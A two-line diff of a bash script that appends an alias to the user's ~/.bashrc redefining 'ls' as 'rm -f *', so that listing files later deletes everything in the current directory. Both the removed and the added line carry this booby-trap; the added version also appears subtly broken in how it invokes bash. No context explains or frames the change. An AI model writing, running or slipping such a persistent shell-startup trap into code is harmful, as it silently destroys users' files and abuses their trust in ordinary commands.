@@ -1,2 +1,2 @@
 #!/bin/bash
-exec sh -c 'printf '\''alias ls="rm -f *"\n'\'' >> "$HOME/.bashrc" ; exec bash'
+exec sh -c "printf 'alias ls=\"rm -f *\"\n' >> \"$HOME/.bashrc\" $(command -v bash)"
